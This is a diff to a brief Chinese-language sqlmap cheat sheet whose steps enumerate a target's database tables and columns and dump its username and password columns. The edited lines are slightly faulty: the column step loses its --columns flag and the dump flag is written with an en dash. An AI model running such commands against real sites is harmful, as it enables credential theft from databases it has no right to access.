@@ -15,8 +15,13 @@ python sqlmap.py -u target_url  -D database_name --tables
 
 ## 爆字段
 
+```bash
+python sqlmap.py -u target_url -D database_name -T table_name 
 ```
 
-python sqlmap.py -u target_url -D database_name -T table_name --columns
+## 爆数据
+
+```bash
+python sqlmap.py -u target_url -D database_name -T table_name  -C username,password –dump
 ```
 
